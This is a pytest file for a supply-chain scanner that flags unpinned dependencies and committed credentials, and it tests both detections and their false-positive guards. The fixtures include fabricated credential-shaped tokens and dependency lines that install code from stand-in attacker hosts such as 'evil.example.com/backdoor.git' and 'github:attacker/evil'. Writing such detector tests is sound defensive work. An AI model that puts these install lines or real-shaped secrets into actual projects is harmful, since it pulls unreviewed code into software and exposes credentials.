"""Tests for the supply-chain hygiene check (SXV-016 unpinned dependency,
SXV-017 committed credential).

Positive cases exercise each detection shape: an unpinned dep in requirements.txt,
package.json, and pyproject.toml, and each credential rule. Negative cases pin the
false-positive guards: an exact pin is silent, a malformed manifest neither crashes
nor fabricates, a placeholder / example key is suppressed, a git SHA is not a
secret, and a fenced example is demoted (not dropped) only in the markdown lane."""

from __future__ import annotations

from skill_xray import ingest, parse
from skill_xray.checks.supply_chain import check

_M = "---\nname: t\n---\n"


def _check(make_package, files):
    files = {"SKILL.md": _M, **files}
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    return check(parsed)


def _by_vector(findings, vector):
    return [f for f in findings if f.vector == vector]


# --- SXV-016: unpinned dependencies ------------------------------------------
def test_requirements_unpinned_fires_pinned_is_silent(make_package):
    # requests is exactly pinned (silent); flask is a range (unpinned, LOW); the
    # -r include line is not a package and must never appear as a finding.
    req = "requests==2.32.3\nflask>=2.0\n-r dev.txt\n"
    f = _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016")
    assert len(f) == 1
    only = f[0]
    assert only.severity == "low" and only.line == 1
    assert only.evidence == {"ecosystem": "PyPI", "package": "flask",
                             "pin_state": "unpinned"}


def test_requirements_variant_is_scanned(make_package):
    findings = _check(make_package, {"requirements-dev.txt": "requests>=2\n"})
    assert _by_vector(findings, "SXV-016")


def test_package_json_ranges_are_unpinned_exact_is_silent(make_package):
    pkg = ('{"dependencies": {"lodash": "^4.17.21", "react": "18.2.0"},\n'
           ' "devDependencies": {"jest": "~29.0.0"}}\n')
    f = _by_vector(_check(make_package, {"package.json": pkg}), "SXV-016")
    names = {x.evidence["package"] for x in f}
    assert names == {"lodash", "jest"}                     # react 18.2.0 is pinned: silent
    assert all(x.evidence["ecosystem"] == "npm" and x.severity == "low" for x in f)


def test_pyproject_unpinned_is_pypi(make_package):
    toml = ('[project]\nname = "x"\nversion = "0.1.0"\n'
            'dependencies = ["requests>=2.0", "click==8.1.7"]\n')
    f = _by_vector(_check(make_package, {"pyproject.toml": toml}), "SXV-016")
    assert len(f) == 1
    assert f[0].evidence == {"ecosystem": "PyPI", "package": "requests",
                             "pin_state": "unpinned"}


def test_all_pinned_manifest_is_clean(make_package):
    # Every dep exactly pinned and no OSV query offline -> no SXV-016 finding.
    req = "requests==2.32.3\nurllib3==2.2.2\n"
    assert _by_vector(_check(make_package, {"requirements.txt": req}), "SXV-016") == []


def test_malformed_manifest_neither_crashes_nor_fabricates(make_package):
    # deps is None on a parse failure; the check has no unresolvable channel, so it
    # contributes nothing rather than crashing or inventing a finding.
    f = _by_vector(_check(make_package, {"package.json": "{not json,,,"}), "SXV-016")
    assert f == []


# --- SXV-017: committed credentials ------------------------------------------
_AWS = "AKIAABCDEFGHIJKLMNOP"          # AKIA + 16 [0-9A-Z]: a real-shaped access key id
_GHP = "ghp_" + "a" * 36               # github PAT: prefix + >=36 alnum
_SLACK = "xoxb-1234567890-1234567890123-abcdefghijklmnopqrstuvwx"   # slack bot token (structured)
_AIZA = "AIza" + "B" * 35              # google api key: AIza + 35
_STRIPE = "sk_live_" + "abcd1234EFGH5678"   # stripe live secret, >=16 body


def test_each_real_credential_shape_fires(make_package):
    body = ("aws = '%s'\n"
            "gh = '%s'\n"
            "slack = '%s'\n"
            "goog = '%s'\n"
            "stripe = '%s'\n"
            "-----BEGIN RSA PRIVATE KEY-----\n"
            % (_AWS, _GHP, _SLACK, _AIZA, _STRIPE))
    f = _by_vector(_check(make_package, {"scripts/x.py": body}), "SXV-017")
    rules = {x.evidence["rule"] for x in f}
    assert rules == {"aws-access-key-id", "github-pat", "slack-token",
                     "google-api-key", "stripe-secret", "private-key"}
    assert all(x.severity == "high" for x in f)            # script lane: no demotion


def test_credential_is_redacted_never_echoed(make_package):
    f = _by_vector(_check(make_package, {"scripts/x.py": "k = '%s'\n" % _AWS}), "SXV-017")
    red = f[0].evidence["redacted"]
    assert red == "AKIA" + "*" * (len(_AWS) - 8) + _AWS[-4:]
    assert _AWS not in red and _AWS not in f[0].message   # the live value never leaks


def test_example_key_is_suppressed(make_package):
    # AWS's own doc key ends in EXAMPLE; the in-token placeholder guard drops it.
    body = "k = 'AKIAIOSFODNN7EXAMPLE'\n"
    assert _by_vector(_check(make_package, {"scripts/x.py": body}), "SXV-017") == []


def test_real_shape_with_adjacent_annotation_still_fires(make_package):
    # placeholder detection is TOKEN-scoped, not line-scoped. A real-shaped credential is NOT
    # dropped just because an unrelated/placeholder word sits elsewhere on the line.
    for line in ("aws_key = '%s'  # <YOUR_KEY>\n" % _AWS,
                 "AWS_ACCESS_KEY_ID=%s  # cdn.example.com\n" % _AWS):
        assert "SXV-017" in {f.vector for f in _check(make_package, {".env": line})}, line


def test_git_sha_is_not_a_secret(make_package):
    # A bare 40-hex git SHA matches no rule by design (no entropy rule exists).
    body = "commit = 'da39a3ee5e6b4b0d3255bfef95601890afd80709'\n"
    assert _by_vector(_check(make_package, {"scripts/x.py": body}), "SXV-017") == []


def test_truncated_pattern_example_is_suppressed(make_package):
    # a credential-shaped token written as a truncated reference example (`xoxb-...abc...`, a
    # secret-pattern table or a security-audit checklist) is not a live secret; the same token
    # written whole still fires.
    for doc in ("| Slack | `xoxb-` | `xoxb-123-456-abcdefghij...` |\n",
                "look for a github token like ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8 ...\n"):
        assert _by_vector(_check(make_package, {"PATTERNS.md": doc}), "SXV-017") == [], doc
    real = "TOKEN = 'xoxb-123-456-abcdefghij'\n"
    assert _by_vector(_check(make_package, {"config.py": real}), "SXV-017")


def test_fenced_example_is_demoted_not_dropped(make_package):
    # A real key inside a ``` block in an instruction file demotes HIGH->MEDIUM.
    guide = "# Guide\n\nHere is a key:\n\n```\n%s\n```\n" % _AWS
    f = _by_vector(_check(make_package, {"GUIDE.md": guide}), "SXV-017")
    assert len(f) == 1
    assert f[0].severity == "medium" and f[0].evidence["fenced_example"] is True


def test_unfenced_markdown_key_stays_high(make_package):
    # Demotion is fence-specific, not lane-specific: a key in prose is still HIGH.
    guide = "# Guide\n\nThe key is %s right here.\n" % _AWS
    f = _by_vector(_check(make_package, {"GUIDE.md": guide}), "SXV-017")
    assert len(f) == 1
    assert f[0].severity == "high" and f[0].evidence["fenced_example"] is False


def test_secret_in_script_is_not_demoted(make_package):
    # A script is not a markdown lane, so even the same shape never demotes.
    f = _by_vector(_check(make_package, {"scripts/x.py": "k = '%s'\n" % _AWS}), "SXV-017")
    assert f[0].severity == "high"


def test_encrypted_and_dsa_private_keys_fire(make_package):
    # The private-key rule must catch ENCRYPTED (PKCS#8), DSA, and bare PKCS#8 headers,
    # not only RSA/EC/OPENSSH/PGP.
    for label in ("ENCRYPTED PRIVATE KEY", "DSA PRIVATE KEY", "PRIVATE KEY"):
        pem = "-----BEGIN %s-----\nMIIBODUMMYINERTBODY\n-----END %s-----\n" % (label, label)
        f = _check(make_package, {"server.pem": pem})
        assert "SXV-017" in {x.vector for x in f}, label


def test_github_published_example_token_is_not_a_leak(make_package):
    # GitHub's canonical published PAT example must not fire; a different ghp_ token still does.
    ex = "token form ghp_16C7e42F292c6912E7710c838347Ae178B4a in the docs\n"
    assert "SXV-017" not in {x.vector for x in _check(make_package, {"README.txt": ex})}
    real = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8\n"
    assert "SXV-017" in {x.vector for x in _check(make_package, {".env": real})}


def test_finegrained_github_pat_fires(make_package):
    # GitHub fine-grained PATs (github_pat_...) are credentials too.
    tok = "github_pat_11ABCDE7Y0aBcDeFgHiJkL_1a2B3c4D5e6F7g8H9i0JkLmNoPqRsTuVwXyZ0123456789aBcDeF"
    f = _check(make_package, {"config.py": "GITHUB_TOKEN = %r\n" % tok})
    assert "SXV-017" in {x.vector for x in f}


def test_slack_placeholder_token_is_suppressed(make_package):
    # "xoxb-your-token-here" is an obvious placeholder, not a live token.
    f = _check(make_package, {"settings.yaml": "slack_bot_token: xoxb-your-token-here\n"})
    assert "SXV-017" not in {x.vector for x in f}


def test_npm_alias_exact_pin_is_silent(make_package):
    # npm:pkg@1.3.0 pins the resolved package exactly -> not unpinned.
    pkg = '{"dependencies": {"realname": "npm:left-pad@1.3.0"}}'
    assert "SXV-016" not in {x.vector for x in _check(make_package, {"package.json": pkg})}
    rng = '{"dependencies": {"realname": "npm:left-pad@^1.3.0"}}'   # a range alias is unpinned
    assert "SXV-016" in {x.vector for x in _check(make_package, {"package.json": rng})}


def test_vcs_url_install_source_fires(make_package):
    # a git+https install line is an unreviewed, unpinned install channel.
    req = "requests==2.31.0\ngit+https://evil.example.com/backdoor.git#egg=backdoor\n"
    f = [x for x in _check(make_package, {"requirements.txt": req}) if x.vector == "SXV-016"]
    assert any(x.rule == "install-from-url" for x in f)


def test_slack_app_level_and_refresh_tokens_fire(make_package):
    # xapp- (app-level / Socket Mode) and xoxe- (token-rotation refresh) are live Slack families.
    body = ("app = 'xapp-1-A0123456789-1234567890123-abcdefabcdefabcdefabcdef'\n"
            "ref = 'xoxe-1-My0-1234567890-abcdefghijklmnop'\n")
    f = _by_vector(_check(make_package, {"config.py": body}), "SXV-017")
    assert len(f) == 2
    assert all(x.evidence["rule"] == "slack-token" and x.severity == "high" for x in f)


def test_vcs_install_covers_all_sdist_extensions(make_package):
    # pip installs .tar.bz2/.tar/.tar.xz sdists too, so a bare archive URL with any of them
    # is an unreviewed install channel -- not only .tar.gz/.zip/.whl.
    req = ("https://example.com/a-1.0.tar.bz2\n"
           "https://example.com/b.tar\n"
           "https://example.com/c-1.0.tar.xz\n")
    f = [x for x in _check(make_package, {"requirements.txt": req})
         if x.vector == "SXV-016" and x.rule == "install-from-url"]
    assert len(f) == 3


def test_backslash_comment_does_not_swallow_next_dependency(make_package):
    # a comment ending in "\" must not be honored as a pip line-continuation.
    req = "# install the following \\\nrequests\nflask>=2.0\n"
    names = {x.evidence["package"] for x in _check(make_package, {"requirements.txt": req})
             if x.vector == "SXV-016"}
    assert names == {"requests", "flask"}


def test_npm_pypi_azure_credentials_fire(make_package):
    # npm automation tokens, PyPI upload tokens, and Azure Storage keys are verifiable-prefix
    # credentials. All values below are fabricated.
    body = ("NPM_TOKEN = 'npm_%s'\n" % ("a1B2c3" * 6)
            + "PYPI_TOKEN = 'pypi-AgEIcHlwaS5vcmcCJDReAlInErTtOkEn1234567890abcdefABCDEF'\n"
            + "AZURE = 'AccountKey=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9w"
            + "cXJzdHV2d3h5ejEyMw==;'\n")
    rules = {f.evidence["rule"] for f in _check(make_package, {"config.py": body})
             if f.vector == "SXV-017"}
    assert {"npm-token", "pypi-token", "azure-storage-key"} <= rules


def test_npm_host_shorthand_and_git_dep_are_install_from_url(make_package):
    # an npm `github:owner/repo` host-shorthand dep and a git+https dep install unreviewed code.
    pkg = ('{"dependencies":{"evil":"github:attacker/evil","ref":'
           '"git+https://github.com/attacker/ref.git","ok":"1.2.3"}}')
    f = [x for x in _check(make_package, {"package.json": pkg}) if x.vector == "SXV-016"]
    inst = [x for x in f if x.rule == "install-from-url"]
    assert len(inst) == 2
    assert all("}" not in x.evidence["install_source"] for x in inst)
    assert {x.evidence.get("package") for x in f if x.rule == "unpinned-dependency"} == set()


def test_repository_metadata_url_is_not_an_install_source(make_package):
    # a standard package.json repository/homepage URL is metadata, not a dependency.
    pkg = ('{"name":"mypkg","version":"1.0.0",'
           '"repository":"git+https://github.com/me/mypkg.git",'
           '"homepage":"https://me.example.com","dependencies":{"lodash":"4.17.21"}}')
    f = [x for x in _check(make_package, {"package.json": pkg})
         if x.vector == "SXV-016" and x.rule == "install-from-url"]
    assert f == []


def test_pep508_direct_url_reference_fires(make_package):
    # a PEP 508 `name @ url` direct reference installs from a URL even without an archive extension.
    req = ("internal-lib @ https://artifacts.corp.example.com/internal-lib/latest\n"
           "requests==2.31.0\n")
    f = [x for x in _check(make_package, {"requirements.txt": req})
         if x.vector == "SXV-016" and x.rule == "install-from-url"]
    assert len(f) == 1 and "internal-lib" in f[0].message


def test_azurite_development_key_is_not_a_leak(make_package):
    # the Azurite / Azure Storage Emulator development AccountKey is a global public constant.
    azurite = ("AzureWebJobsStorage=DefaultEndpointsProtocol=http;AccountName=devstoreaccount1;"
               "AccountKey=Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/"
               "K1SZFPTOtr/KBHBeksoGMGw==;BlobEndpoint=http://127.0.0.1:10000/devstoreaccount1;\n")
    assert "SXV-017" not in {f.vector for f in _check(make_package,
                                                      {"local.settings.json": azurite})}
    real = "AccountKey=RmFrZUtleUZvclRlc3RpbmcxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnc=\n"
    assert "SXV-017" in {f.vector for f in _check(make_package, {"cfg.py": real})}


def test_cosmos_emulator_key_is_not_a_leak(make_package):
    # the Azure Cosmos DB Emulator well-known primary key is the sibling emulator constant.
    cosmos = ('{"ConnectionStrings":{"CosmosDb":"AccountEndpoint=https://localhost:8081/;'
              'AccountKey=C2y6yDjf5/R+ob0N8A7Cgv30VRDJIWEHLM+4QDU5DE2nQ9nDuVTqobD4b8mGGyPMbIZnqy'
              'MsEcaGQy67XIw/Jw==;"}}\n')
    assert "SXV-017" not in {f.vector for f in _check(make_package, {"appsettings.json": cosmos})}


def test_slack_placeholder_and_prose_are_not_leaks_but_real_token_fires(make_package):
    # an all-zeros placeholder in a .env.example and plain kebab-case prose must not fire HIGH.
    zeros = "SLACK_BOT_TOKEN=xoxb-0000000000-0000000000000-abcdefghijklmnopqrstuvwx\n"
    assert "SXV-017" not in {f.vector for f in _check(make_package, {".env.example": zeros})}
    prose = "The value looks like xoxb-not-really-a-token-just-words in the docs.\n"
    assert "SXV-017" not in {f.vector for f in _check(make_package, {"README.md": prose})}
    real = "TOKEN = 'xoxb-1234567890-1234567890123-abcdefghijklmnopqrstuvwx'\n"
    assert "SXV-017" in {f.vector for f in _check(make_package, {"config.py": real})}


def test_pyproject_metadata_url_is_not_an_install_source(make_package):
    # a URL in a pyproject description / [project.urls] field is not a dependency.
    pyproj = ('[project]\nname = "x"\nversion = "1.0"\n'
              'description = "download from https://data.example.org/corpus.tar.gz first"\n'
              'dependencies = ["requests==2.31.0", "click==8.1.7"]\n'
              '[project.urls]\nHomepage = "https://example.org"\n')
    f = [x for x in _check(make_package, {"pyproject.toml": pyproj})
         if x.vector == "SXV-016" and x.rule == "install-from-url"]
    assert f == []
    req = "requests==2.31.0\ngit+https://evil.example.com/backdoor.git#egg=backdoor\n"
    assert any(x.rule == "install-from-url"
               for x in _check(make_package, {"requirements.txt": req}) if x.vector == "SXV-016")


def test_pep508_direct_ref_reported_once_not_also_low_unpinned(make_package):
    # a `name @ url` direct ref is reported once as MEDIUM install-from-url (no redundant LOW).
    req = "requests==2.31.0\nmylib @ https://example.com/mylib-1.0.tar.gz\n"
    f = [x for x in _check(make_package, {"requirements.txt": req}) if x.vector == "SXV-016"]
    assert len(f) == 1 and f[0].rule == "install-from-url" and f[0].severity == "medium"


def test_pyproject_direct_ref_is_install_from_url_not_low(make_package):
    # a pyproject PEP 508 `name @ url` direct-reference dep is one MEDIUM install-from-url.
    toml = ('[project]\nname = "x"\nversion = "1"\n'
            'dependencies = ["mylib @ https://example.com/mylib-1.0.tar.gz"]\n')
    g = [x for x in _check(make_package, {"pyproject.toml": toml}) if x.vector == "SXV-016"]
    assert len(g) == 1 and g[0].rule == "install-from-url"


def test_backslash_split_direct_ref_is_still_install_from_url(make_package):
    # a `name @ url` dep split with a pip backslash line-continuation is caught via joined dep.raw.
    req = b"bar @ git+https\\\n://host/repo\n"             # pip joins to `bar @ git+https://host/repo`
    f = [x for x in _check(make_package, {"requirements.txt": req}) if x.vector == "SXV-016"]
    assert len(f) == 1 and f[0].rule == "install-from-url" and f[0].severity == "medium"


def test_pip_option_line_is_not_a_dependency(make_package):
    # a pip global-option line (--find-links=<wheel URL>) is configuration, not a dependency.
    req = "flask==2.1.0\n--find-links=https://example.com/mypkg-1.0-py3-none-any.whl\n"
    f = [x for x in _check(make_package, {"requirements.txt": req})
         if x.vector == "SXV-016" and x.rule == "install-from-url"]
    assert f == []
